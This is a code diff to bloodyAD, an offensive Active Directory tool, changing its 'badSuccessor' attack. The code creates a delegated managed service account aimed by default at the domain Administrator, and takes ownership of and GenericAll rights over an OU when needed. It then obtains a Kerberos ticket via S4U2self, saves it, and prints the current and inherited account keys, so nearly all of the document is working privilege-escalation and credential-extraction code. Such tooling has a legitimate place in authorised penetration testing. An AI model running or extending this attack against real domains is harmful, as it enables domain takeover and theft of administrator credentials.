@@ -7,18 +7,22 @@ from bloodyAD.exceptions import LOG
 from bloodyAD.formatters import accesscontrol, common, cryptography, dns
 from bloodyAD.network.ldap import Change, Scope
 from bloodyAD.exceptions import BloodyError
+from bloodyAD.cli_modules import set as bloodySet
 import msldap
 from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from minikerberos.common import factory
+from minikerberos.common.spn import KerberosSPN
+from minikerberos.common.kirbi import Kirbi
+from minikerberos.common.ccache import CCACHE
 from minikerberos.protocol.external import ticketutil
+from minikerberos.protocol.encryption import Enctype
+from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
 
 
 # TODO make it multi forest
-# TODO kerberos url should be adapted depending of credential provided
-# TODO print the previous keys stored in the Ticket
-def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
+def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Current,DC=Domain"], ou: str = None):
     """
     Add a new DMSA (Dedicated Managed Service Account) object
 
@@ -26,9 +30,6 @@ def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
     :param t: Distinguished Name of the target whose privileges are to be assumed (can be called multiple times, e.g. "-t CN=Admin,CN=Users,DC=domain,DC=com -t CN=User,CN=Users,DC=domain,DC=com")
     :param ou: Organizational Unit for the DMSA object. If not provided, chooses the first OU the logged user can add child to.
     """
-    if not t:
-        raise BloodyError("No target provided, use -t to provide one")
-    print(t)
     # Check if the schema version is 2025
     schema_version = next(
         conn.ldap.bloodysearch(
@@ -38,6 +39,9 @@ def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
 
     if int(schema_version[0]) < 91:
         raise BloodyError("Schema version is not 2025. DMSA creation is not supported.")
+
+    if len(t) == 1 and "CN=Administrator,CN=Users,DC=Current,DC=Domain" in t[0]:
+        t = ["CN=Administrator,CN=Users," + conn.ldap.domainNC]
 
     # First we try to find a OU where we can add a child object
     # If we don't find one, we will use the first one where we have DACL write on
@@ -71,11 +75,12 @@ def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
                 # Choose the first OU we can add child to
                 ou = writable_ou[0]
             elif writable_nt_ou:
-                genericAll(conn, writable_nt_ou[0], conn.conf.username)
+                ou = writable_nt_ou[0]
+                genericAll(conn, ou, conn.conf.username)
             elif writable_owner_ou:
-                from bloodyAD.cli_modules import set as bloodySet
-                bloodySet.owner(conn, writable_nt_ou[0], conn.conf.username)
-                genericAll(conn, writable_nt_ou[0], conn.conf.username)
+                ou = writable_owner_ou[0]
+                bloodySet.owner(conn, ou, conn.conf.username)
+                genericAll(conn, ou, conn.conf.username)
             else:
                 raise BloodyError("No suitable OU found for adding the DMSA object")
 
@@ -86,12 +91,10 @@ def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
     self_obj = next(conn.ldap.bloodysearch(conn.ldap.domainNC,
             ldap_filter=f"(sAMAccountName={conn.conf.username})",
             search_scope=Scope.SUBTREE, attr=["objectSid"]))
-    self_dn = self_obj["distinguishedName"]
     self_sid = self_obj["objectSid"]
     utils.addRight(new_sd, self_sid, access_mask)
 
     dmsa_sama = dmsa + "$"
-    from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
     attr = {
         "objectClass": ["msDS-DelegatedManagedServiceAccount"],
         "sAMAccountName": dmsa+'$',
@@ -104,24 +107,47 @@ def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
         "userAccountControl": 0x1000
     }
     conn.ldap.bloodyadd(dmsa_dn, attributes=attr)
-    LOG.info(f"[+] DMSA {dmsa_sama} created")
+    LOG.info(f"[+] DMSA {dmsa_sama} created in {ou}")
 
     client = None
     path = dmsa + "_" + "".join(
             random.choice(string.ascii_letters + string.digits) for i in range(2)
         )
+    splitted_url = conn.ldap.co_url.split("-",1)
+    if "sspi" in splitted_url[0]:
+        LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or minikerberos certstore, e.g.:")
+        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py 'kerberos+certstore://{conn.conf.domain}\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.conf.domain}@{conn.conf.domain}' '{dmsa_sama}@{conn.conf.domain}' --dmsa")
+        return
+    url = "kerberos+" + splitted_url[1]
+    LOG.debug(f"[+] Using minikerberos url: {url}")
+    try:
+        cu = factory.KerberosClientFactory.from_url(url)
+        client = cu.get_client_blocking()
+        service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.conf.domain}@{conn.conf.domain}")
+        target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.conf.domain}")
+        tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn, is_dmsa=True)
+    except Exception as e:
+        LOG.error(f"[-] Failed to retrieve dMSA TGT")
+        LOG.error("[-] Try using Rubeus, or something like:")
+        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py '{url}' 'krbtgt/{conn.conf.domain}@{conn.conf.domain}' '{dmsa_sama}@{conn.conf.domain}' --dmsa")
+        raise e
 
-    url = f"kerberos+pw://{conn.conf.domain}\\{conn.conf.username}:{conn.conf.password}@{conn.conf.dcip}"
-    cu = factory.KerberosClientFactory.from_url(url)
-    client = cu.get_client_blocking()
-    from minikerberos.common.spn import KerberosSPN
-    service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.conf.domain}@{conn.conf.domain}")
-    target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.conf.domain}")
-    tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn, is_dmsa=True)
+    kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
+    LOG.info(str(kirbi))
 
+    ccache = CCACHE().from_kirbi(kirbi)
     ccache_path = path + ".ccache"
-    client.ccache.to_file(path + ".ccache")
+    ccache.to_file(path + ".ccache")
     LOG.info('[+] dMSA TGT stored in ccache file %s' % ccache_path)
+
+    dmsa_pack = ticketutil.get_KRBKeys_From_TGSRep(encTGSRepPart)
+
+    LOG.info('\ndMSA current keys found in TGS:')
+    for current_key in dmsa_pack['current-keys']:
+        LOG.info("%s: %s" % (Enctype.get_name(current_key['keytype']), current_key['keyvalue'].hex()))
+    LOG.info('\ndMSA previous keys found in TGS (including keys of preceding managed accounts):')
+    for previous_key in dmsa_pack['previous-keys']:
+        LOG.info("%s: %s" % (Enctype.get_name(previous_key['keytype']), previous_key['keyvalue'].hex()))
 
 
 def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
@@ -450,8 +476,6 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
                 host=host_params["name"],
                 dcip=host_params["ip"],
             )
-
-
 
     target_dn = None
     target_sAMAccountName = None
